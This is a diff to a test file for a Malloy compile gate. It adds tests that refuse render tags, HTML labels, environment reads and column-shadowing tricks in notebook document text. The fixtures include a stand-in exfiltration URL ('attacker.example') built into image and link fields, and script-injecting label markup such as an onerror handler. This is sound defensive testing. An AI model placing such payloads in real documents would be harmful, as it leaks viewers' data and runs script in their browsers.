@@ -24,17 +24,23 @@
  */
 
 import { afterEach, beforeEach, describe, expect, it } from "bun:test";
+import fsSync from "fs";
 import fs from "fs/promises";
 import os from "os";
 import path from "path";
 import { CompileRefusedError } from "../errors";
-import { onlyParseFailures } from "./compile_restriction";
+import { onlyParseFailures, renderTagRefusal } from "./compile_restriction";
 import { Environment } from "./environment";
 
 // The curated model. It publishes `base_source` and nothing else; every
 // hostile fragment below tries to reach past it.
 const BASE_MODEL = `source: base_source is duckdb.sql("select 1 as id, 5 as n") extend {
   measure: c is count()
+}`;
+
+const IMAGES_MODEL = `source: pics is duckdb.sql("select 'https://example.test/a.png' as pic") extend {
+  dimension: # image
+    pic_url is pic
 }`;
 
 const TRACKS_MODEL = `import "base.malloy"
@@ -78,6 +84,10 @@ describe("compile construct containment", () => {
             '{"name":"pkg"}',
          );
          await fs.writeFile(path.join(stagingPath, "base.malloy"), BASE_MODEL);
+         await fs.writeFile(
+            path.join(stagingPath, "images.malloy"),
+            IMAGES_MODEL,
+         );
          await fs.writeFile(
             path.join(stagingPath, "tracks.malloy"),
             TRACKS_MODEL,
@@ -391,6 +401,415 @@ source: published is duckdb.sql("select 1 as id") extend {
                "append",
             ),
          ).rejects.toThrow(CompileRefusedError);
+      });
+   });
+
+   // -- render tags that turn a value into a URL -------------------------------
+
+   describe('scope "append" refuses render tags in text that is a document', () => {
+      // The refusal is for document text, which other viewers run; a plain fragment is the caller's own compile.
+      const DOCUMENT = "## artifact { kind=notebook }\n";
+      const docRefusalFor = (source: string, scope: "append") =>
+         refusalFor(DOCUMENT + source, scope);
+      const docErrorsFor = (source: string, scope: "append") =>
+         errorsFor(DOCUMENT + source, scope);
+      const docCompile = (source: string, scope: "append") =>
+         compile(DOCUMENT + source, scope);
+      const LEAK = "https://attacker.example/p?d=";
+      // An annotation runs to the end of its line, so each sits on its own.
+      const grp = (annotation: string, field = "pic is 'x'") =>
+         `run: base_source -> {\n  group_by:\n${annotation}\n  ${field}\n}`;
+      const RENDER = "render tag";
+      const HTML = "HTML in a";
+      const forms: Record<string, [string, string]> = {
+         "# image on a dimension": [
+            `source: leaky is base_source extend {\n  dimension: # image\n    pic is concat('${LEAK}', 'x')\n}\nrun: leaky -> { group_by: pic }`,
+            RENDER,
+         ],
+         "# image inline before the field name": [
+            `source: leaky is base_source extend {\n  dimension:\n  # image\n  pic is concat('${LEAK}', 'x')\n}\nrun: leaky -> { group_by: pic }`,
+            RENDER,
+         ],
+         "# image on a query's output field": [grp("  # image"), RENDER],
+         "# link with a url_template": [
+            grp(`  # link { url_template="${LEAK}$$" }`),
+            RENDER,
+         ],
+         "# link on a view": [
+            `source: leaky is base_source extend {\n  # link\n  view: v is { group_by: id }\n}\nrun: leaky -> v`,
+            RENDER,
+         ],
+         "# image under another tag": [grp("  # column { image }"), RENDER],
+         "an image tag with options": [
+            grp("  # image { height=40px }"),
+            RENDER,
+         ],
+         "HTML in a # label": [
+            grp('  # label="<img src=x onerror=alert(1)>"'),
+            HTML,
+         ],
+         "a backtick-quoted image tag": [grp("  # `image`"), RENDER],
+         "a backtick-quoted link tag": [
+            grp(`  # \`link\` { url_template="${LEAK}$$" }`),
+            RENDER,
+         ],
+         "a quoted image tag (which MOTLY rejects, so it fails closed)": [
+            grp('  # "image"'),
+            "does not parse",
+         ],
+         "an image tag in a #| block": [
+            `run: base_source -> {\n  group_by:\n#|\nimage\n|#\n  pic is concat('${LEAK}', 'x')\n}`,
+            RENDER,
+         ],
+         "a link tag in a #| block": [
+            `run: base_source -> {\n  group_by:\n#|\nlink { url_template="${LEAK}$$" }\n|#\n  pic is 'x'\n}`,
+            RENDER,
+         ],
+         "an image tag after other tags in one line": [
+            grp('  # label="P" hidden image'),
+            RENDER,
+         ],
+         "a label with an escaped quote ahead of the markup": [
+            grp('  # label="a\\"<img src=x>"'),
+            HTML,
+         ],
+         "a label with a unicode escape for <": [
+            grp('  # label="\\u003cimg src=x>"'),
+            HTML,
+         ],
+         "a closing tag in a label": [grp('  # label="</b>"'), HTML],
+         "a comment in a label": [grp('  # label="<!-- x -->"'), HTML],
+         "an opening tag with attributes closed later in the label": [
+            grp('  # label="<b onclick=x a> y"'),
+            HTML,
+         ],
+         "a single-quoted label with markup": [
+            grp("  # label='<b>x</b>'"),
+            HTML,
+         ],
+         "an image tag nested in a viz tag's array": [
+            grp("  # bar_chart { series = [ { image } ] }"),
+            RENDER,
+         ],
+      };
+
+      for (const [name, [source, message]] of Object.entries(forms)) {
+         it(`refuses ${name}, before anything compiles`, async () => {
+            const error = await docRefusalFor(source, "append");
+            expect(error).toBeInstanceOf(CompileRefusedError);
+            expect(error.message).toContain('scope "append"');
+            // The unparseable-text refusal also names the scope, so it must be this gate that spoke.
+            expect(error.message).toContain(message);
+         });
+      }
+
+      it("answers a field that exists and one that does not with the same shape", async () => {
+         const answer = async (field: string) =>
+            (
+               await docRefusalFor(
+                  grp("  # image", `pic is concat('${LEAK}', ${field})`),
+                  "append",
+               )
+            ).message;
+         expect(await answer("id")).toBe(await answer("no_such_column"));
+      });
+
+      it("is not fooled by an apostrophe in a prose block ahead of the tag", async () => {
+         const error = await docRefusalFor(
+            `##|(markdown) intro\ndon't stop\n|##\n${grp("  # image")}`,
+            "append",
+         );
+         expect(error.message).toContain(RENDER);
+      });
+
+      describe("an annotation that reads the environment, does not parse, or is too long", () => {
+         const unsafe: Record<string, [string, string]> = {
+            "an image tag valued from @env.": [
+               grp("  # image=@env.HOME"),
+               "@env.",
+            ],
+            "an image tag with an @env. property": [
+               grp("  # image { alt=@env.HOME }"),
+               "@env.",
+            ],
+            "a link tag with an @env. template": [
+               grp("  # link { url_template=@env.X }"),
+               "@env.",
+            ],
+            "an @env. value in a #| block": [
+               `run: base_source -> {\n  group_by:\n#|\nimage=@env.X\n|#\n  pic is 'x'\n}`,
+               "@env.",
+            ],
+            "markup in a label beside an @env. value": [
+               grp('  # label="<img src=x>" x=@env.X'),
+               "@env.",
+            ],
+            "an @env. value in the ## artifact tag": [
+               `## artifact { kind=dashboard title=@env.HOME tiles=["base_source -> v"] }\nrun: base_source -> { aggregate: c }`,
+               "@env.",
+            ],
+            "an @env. value in a tile string": [
+               `## artifact { tiles=["base_source -> { aggregate: c } @env.X"] }\nrun: base_source -> { aggregate: c }`,
+               "@env.",
+            ],
+            "an @env. value in a sibling ## dashboard tag": [
+               `## dashboard { columns=@env.HOME }\nrun: base_source -> { aggregate: c }`,
+               "@env.",
+            ],
+            "an unclosed tag the renderer may read differently": [
+               grp("  # image {"),
+               "does not parse",
+            ],
+            "an annotation past the length bound": [
+               grp(`  # label="${"a".repeat(9000)}"`),
+               "exceeds",
+            ],
+         };
+         for (const [name, [source, message]] of Object.entries(unsafe)) {
+            it(`refuses ${name}`, async () => {
+               const error = await docRefusalFor(source, "append");
+               expect(error).toBeInstanceOf(CompileRefusedError);
+               expect(error.message).toContain(message);
+            });
+         }
+      });
+
+      describe("a fragment with more annotations than any document carries", () => {
+         const run = "run: base_source -> { group_by: id }";
+         const timed = async (source: string) => {
+            const started = performance.now();
+            const error = await docRefusalFor(source, "append");
+            return { error, ms: performance.now() - started };
+         };
+
+         it("refuses a body of many annotations in well under a second", async () => {
+            const { error, ms } = await timed(
+               `${"# a\n".repeat(250_000)}${run}`,
+            );
+            expect(error.message).toContain("more annotations");
+            expect(ms).toBeLessThan(1500);
+         });
+
+         it("refuses an annotation count over the cap", async () => {
+            const { error } = await timed(`${"# a\n".repeat(1_001)}${run}`);
+            expect(error.message).toContain("more annotations");
+         });
+
+         it("refuses many long annotations, which cost parse time rather than count", async () => {
+            const nested = `# ${"a{".repeat(2_700)}${"}".repeat(2_700)}\n`;
+            const { error, ms } = await timed(`${nested.repeat(125)}${run}`);
+            expect(error.message).toContain("more annotations");
+            expect(ms).toBeLessThan(1500);
+         });
+
+         it("accepts as many annotations as the largest committed model", async () => {
+            const lines = Array.from(
+               { length: 322 },
+               (_, i) => `# label="l${i}"`,
+            ).join("\n");
+            expect(
+               await docErrorsFor(
+                  `source: s is base_source extend {\n${lines}\n  measure: m is count()\n}\nrun: s -> { aggregate: m }`,
+                  "append",
+               ),
+            ).toEqual([]);
+         });
+      });
+
+      it("accepts every committed .malloy file, so no fixture is refused that the renderer reads fine", () => {
+         const roots = [
+            path.resolve(__dirname, "../../tests/fixtures"),
+            path.resolve(__dirname, "../../../../examples"),
+            path.resolve(__dirname, "../../../skills/skills"),
+         ];
+         const refused: string[] = [];
+         const walk = (dir: string) => {
+            for (const entry of fsSync.readdirSync(dir, {
+               withFileTypes: true,
+            })) {
+               const full = path.join(dir, entry.name);
+               if (entry.isDirectory()) {
+                  if (entry.name !== "node_modules") walk(full);
+               } else if (entry.name.endsWith(".malloy")) {
+                  const reason = renderTagRefusal(
+                     fsSync.readFileSync(full, "utf8"),
+                  );
+                  if (reason) refused.push(`${full}: ${reason}`);
+               }
+            }
+         };
+         for (const root of roots) walk(root);
+         expect(refused).toEqual([]);
+      });
+
+      describe("agrees with the SDK's strip list on one case table", () => {
+         const { cases } = JSON.parse(
+            fsSync.readFileSync(
+               path.resolve(
+                  __dirname,
+                  "../../../sdk/src/components/DashboardBuilder/testing/urlRenderTags.json",
+               ),
+               "utf8",
+            ),
+         ) as {
+            cases: { name: string; annotation: string; offends: boolean }[];
+         };
+         for (const { name, annotation, offends } of cases) {
+            it(`${offends ? "refuses" : "accepts"} ${name}`, () => {
+               const refusal = renderTagRefusal(
+                  `${annotation}\nsource: s is base_source extend { measure: m is count() }\n`,
+               );
+               expect(refusal !== undefined).toBe(offends);
+            });
+         }
+      });
+
+      describe("a column excepted and declared again", () => {
+         const shadow: Record<string, string> = {
+            "a dimension in the same extend": `source: s2 is base_source extend {\n  except: id\n  dimension: id is 'x'\n}\nrun: s2 -> { group_by: id }`,
+            "a measure": `source: s2 is base_source extend {\n  except: c\n  measure: c is count()\n}\nrun: s2 -> { aggregate: c }`,
+            "a join": `source: s2 is base_source extend {\n  except: j\n  join_one: j is base_source on j.id = id\n}\nrun: s2 -> { group_by: id }`,
+            "a rename target": `source: s2 is base_source extend {\n  except: a\n  rename: a is id\n}\nrun: s2 -> { group_by: a }`,
+            "an inline extend inside a query": `run: base_source extend {\n  except: id\n  dimension: id is 'x'\n} -> { group_by: id }`,
+            "a backtick-quoted name": `source: s2 is base_source extend {\n  except: \`my col\`\n  dimension: \`my col\` is 'x'\n}\nrun: s2 -> { group_by: id }`,
+            "a name declared in a later statement": `source: s2 is base_source extend { except: id }\nsource: s3 is s2 extend {\n  dimension: id is 'x'\n}\nrun: s3 -> { group_by: id }`,
+            "a name freed by rename: and then declared": `source: leaky is base_source extend {\n  rename: id0 is id\n  dimension: id is 'x'\n}\nrun: leaky -> { group_by: id }`,
+            "a backtick name with a unicode escape": `source: s2 is base_source extend {\n  except: id\n  dimension: \`\\u0069d\` is 'x'\n}\nrun: s2 -> { group_by: id }`,
+            "an excepted name spelled with an escape and declared plainly": `source: s2 is base_source extend {\n  except: \`\\u0069d\`\n  dimension: id is 'x'\n}\nrun: s2 -> { group_by: id }`,
+            "a name declared in a chained extend": `source: s2 is base_source extend { except: id } extend {\n  dimension: id is 'x'\n}\nrun: s2 -> { group_by: id }`,
+         };
+         for (const [name, source] of Object.entries(shadow)) {
+            it(`refuses ${name}`, async () => {
+               const error = await docRefusalFor(source, "append");
+               expect(error).toBeInstanceOf(CompileRefusedError);
+               expect(error.message).toContain("and then declares");
+            });
+         }
+
+         it("accepts a name excepted in one source and declared in an unrelated one", async () => {
+            // The gate must not refuse; Malloy may still report its own redefinition.
+            await expect(
+               docCompile(
+                  `source: aa is base_source extend { except: id }\nsource: bb is base_source extend {\n  dimension: id is 7\n}\nrun: bb -> { group_by: id }`,
+                  "append",
+               ),
+            ).resolves.toBeDefined();
+         });
+
+         it("still accepts an except: that declares nothing of the same name", async () => {
+            const errors = await docErrorsFor(
+               `source: s2 is base_source extend {\n  except: id\n  dimension: label is 'x'\n}\nrun: s2 -> { aggregate: c }`,
+               "append",
+            );
+            expect(errors).toEqual([]);
+         });
+      });
+
+      const accepted: Record<string, string> = {
+         "a field named link used as a tag value": `run: base_source -> {\n  group_by:\n  # bar_chart { x = link }\n  link is 'x'\n}`,
+         "a field named image in a pivot list": `run: base_source -> {\n  group_by:\n  # pivot { dimensions=[image] }\n  image is 'x'\n}`,
+         "prose that starts with a tag name in a #| block": `run: base_source -> {\n  group_by:\n#|(markdown)\n# link to the data\n|#\n  pic is 'x'\n}`,
+         "a model-level ## image note": `## image\nrun: base_source -> { group_by: pic is 'x' }`,
+         "a doc note naming image": `#(docs) image of the data\nrun: base_source -> { group_by: pic is 'x' }`,
+         "a label that mentions a less-than sign": `run: base_source -> {\n  group_by:\n  # label="a < b"\n  id\n}`,
+         "a label with an unclosed angle bracket in text": `run: base_source -> {\n  group_by:\n  # label="Actual<Target"\n  id\n}`,
+         "a label that compares a<b": `run: base_source -> {\n  group_by:\n  # label="a<b"\n  id\n}`,
+         "a field-level artifact tag with a bare filter literal": `# artifact { autorun=false givens { REGION=f'US' } }\nquery: regions is base_source -> { group_by: id }`,
+      };
+      for (const [name, source] of Object.entries(accepted)) {
+         it(`accepts ${name}`, async () => {
+            const { problems } = await docCompile(source, "append");
+            expect(
+               problems.filter(
+                  (p) => p.code === "restricted-construct-forbidden",
+               ),
+            ).toEqual([]);
+         });
+      }
+
+      it("leaves a caller field with unrelated tags alone", async () => {
+         const errors = await docErrorsFor(
+            `source: s is base_source extend {\n  # label="Rows"\n  measure: rows is count()\n  # bar_chart\n  view: v is { aggregate: rows }\n}\nrun: s -> v`,
+            "append",
+         );
+         expect(errors).toEqual([]);
+      });
+
+      it("does not read a tag name inside a string or a comment as a tag", async () => {
+         const errors = await docErrorsFor(
+            `// # image\nrun: base_source -> { group_by: # label="an image link"\n x is 'image'\n}`,
+            "append",
+         );
+         expect(errors).toEqual([]);
+      });
+
+      describe("a document whose tag follows code on its line", () => {
+         const LEAK_FIELD = `source: s is base_source extend {\n  dimension:\n  # image\n  pic is concat('${LEAK}', 'x')\n}\nrun: s -> { group_by: pic }\n`;
+
+         it("is read as a document, so a render tag in it is refused", async () => {
+            const error = await refusalFor(
+               `run: base_source -> { group_by: id } ## artifact { kind=notebook }\n${LEAK_FIELD}`,
+               "append",
+            );
+            expect(error.message).toContain(RENDER);
+         });
+
+         it("is not read as a document when the ## sits in a string", async () => {
+            const outcome = await compile(
+               `run: base_source -> { group_by: x is '## artifact { kind=notebook }' }\n${LEAK_FIELD}`,
+               "append",
+            ).then(
+               () => undefined,
+               (caught: unknown) => caught,
+            );
+            expect(outcome).not.toBeInstanceOf(CompileRefusedError);
+         });
+      });
+
+      describe("plain append text, which is the caller's own compile", () => {
+         const plain: Record<string, string> = {
+            "# image on a field": grp("  # image"),
+            "# link with a template": grp(
+               `  # link { url_template="${LEAK}$$" }`,
+            ),
+            "markup in a label": grp('  # label="<b>x</b>"'),
+            "an unparseable annotation": grp("  # image {"),
+            "an @env. value": grp("  # label=@env.HOME"),
+            "an except: and a redeclaration": `source: s2 is base_source extend {\n  except: id\n  dimension: id is 'x'\n}\nrun: s2 -> { group_by: id }`,
+         };
+         for (const [name, source] of Object.entries(plain)) {
+            it(`is not refused for ${name}`, async () => {
+               // Malloy may still report its own problem; only this gate's refusal is excluded.
+               const outcome = await compile(source, "append").then(
+                  () => undefined,
+                  (caught: unknown) => caught,
+               );
+               expect(outcome).not.toBeInstanceOf(CompileRefusedError);
+            });
+         }
+      });
+
+      it("compiles a plain fragment with # image and # link, as it did before document text was held to the tags", async () => {
+         for (const annotation of [
+            "  # image",
+            `  # link { url_template="${LEAK}$$" }`,
+         ]) {
+            expect(await errorsFor(grp(annotation), "append")).toEqual([]);
+         }
+      });
+
+      it("keeps a model-defined # image working", async () => {
+         const { problems } = await compile(
+            `run: pics -> { group_by: pic_url }`,
+            "append",
+            "images.malloy",
+         );
+         expect(problems.filter((p) => p.severity === "error")).toEqual([]);
+      });
+
+      it("does not refuse the model file's own tags at scope file", async () => {
+         const { problems } = await compile(IMAGES_MODEL, "file");
+         expect(problems.filter((p) => p.severity === "error")).toEqual([]);
       });
    });
 
